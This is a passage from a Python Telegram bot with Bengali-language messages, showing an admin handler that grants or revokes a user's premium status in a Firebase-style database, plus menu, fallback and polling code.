def handle_admin_target(msg):
    cid    = msg.chat.id
    target = (msg.text or "").strip()
    step   = user_state.get(cid, {}).get("step")

    # resolve @username → chat_id via telegram
    target_cid = target.lstrip("@")
    all_users  = fb_get("users") or {}
    matched    = None
    for uid, ud in all_users.items():
        uname = str(ud.get("username",""))
        if uid == target_cid or uname.lower() == target_cid.lower():
            matched = uid
            break

    if not matched:
        bot.send_message(cid, f"❌ User `{target}` পাওয়া যায়নি।")
        user_state.pop(cid, None)
        return

    if step == "adm_mkprem":
        fb_set(f"users/{matched}/premium", True)
        bot.send_message(cid, f"✅ `{matched}` কে Premium করা হয়েছে।")
        try: bot.send_message(int(matched), "🎉 আপনাকে Premium করা হয়েছে! Unlimited access enjoy করুন।")
        except: pass
    else:
        fb_set(f"users/{matched}/premium", False)
        bot.send_message(cid, f"🚫 `{matched}` এর Premium সরানো হয়েছে।")

    user_state.pop(cid, None)

# ─────────────────────────────────────────
# BACK TO MENU
# ─────────────────────────────────────────
@bot.message_handler(func=lambda m: m.text == "🔙 Back to Menu")
def handle_back(msg):
    user_state.pop(msg.chat.id, None)
    bot.send_message(msg.chat.id, "মেনু:", reply_markup=main_kb())

# ─────────────────────────────────────────
# FALLBACK
# ─────────────────────────────────────────
@bot.message_handler(func=lambda m: True)
def fallback(msg):
    cid = msg.chat.id
    u   = get_user(cid)
    if not u.get("email"):
        _show_auth_menu(cid)
    else:
        bot.send_message(cid, "মেনু থেকে অপশন বেছে নিন:", reply_markup=main_kb())

# ─────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────
if __name__ == "__main__":
    print("✅ Bot চালু হয়েছে...")
    bot.infinity_polling(skip_pending=True)
